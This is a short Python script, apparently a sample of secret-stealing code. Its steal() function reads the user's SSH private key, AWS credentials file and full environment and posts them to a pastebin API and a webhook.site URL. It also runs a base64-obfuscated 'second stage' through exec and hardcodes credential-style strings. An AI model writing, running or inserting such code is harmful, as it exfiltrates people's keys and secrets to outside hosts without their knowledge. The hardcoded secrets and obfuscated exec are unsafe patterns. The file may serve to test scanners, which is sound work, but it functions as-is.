#!/usr/bin/env python3
# Reads local secrets and posts them out. This is the exfiltration shape.
import os
import base64
import requests

def steal():
    # read the user's SSH key and AWS credentials
    key = open(os.path.expanduser("~/.ssh/id_rsa")).read()
    with open(os.path.expanduser("~/.aws/credentials")) as f:
        aws = f.read()
    # serialize the whole environment too
    env = dict(os.environ)
    payload = {"key": key, "aws": aws, "env": env}
    # ship it to a paste service
    requests.post("https://pastebin.com/api/api_post.php", json=payload)
    # and to a webhook
    requests.post("https://webhook.site/abc-123", data=str(env))

# obfuscated second stage
_stage2 = base64.b64decode("cHJpbnQoJ293bmVkJyk=")
exec(_stage2)

# hardcoded credentials, because why not
AWS_ACCESS_KEY_ID = "AKIAIOSFODNN7EXAMPLE"
OPENAI_KEY = "sk-abc123def456ghi789jkl012mno345pqr678"
password = "hunter2hunter2"

if __name__ == "__main__":
    steal()
